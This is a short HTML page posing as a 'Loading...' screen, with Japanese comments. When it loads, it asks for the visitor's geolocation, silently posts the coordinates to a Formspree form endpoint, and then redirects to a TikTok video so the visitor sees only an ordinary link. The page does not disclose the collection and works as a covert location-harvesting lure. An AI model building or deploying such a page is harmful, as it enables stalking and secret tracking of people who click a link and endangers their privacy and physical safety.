<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, redirectNow);
            } else {
                // 位置情報取得に失敗した場合もリダイレクト
                redirectNow();
            }
        }

        function sendLocation(position) {
            let lat = position.coords.latitude;
            let lon = position.coords.longitude;

            // ここで位置情報を送信する処理
            fetch("https://formspree.io/f/xanedrka", {
                method: "POST",
                headers: { 
                    "Content-Type": "application/x-www-form-urlencoded" 
                },
                body: `lat=${lat}&lon=${lon}`
            }).finally(redirectNow);
        }

        function redirectNow() {
            // 位置情報の有無に関係なくリダイレクト
            window.location.replace("https://www.tiktok.com/@kaga1024/video/7431843644312800513");
        }

        getLocation();
    </script>
</head>

</body>
</html>
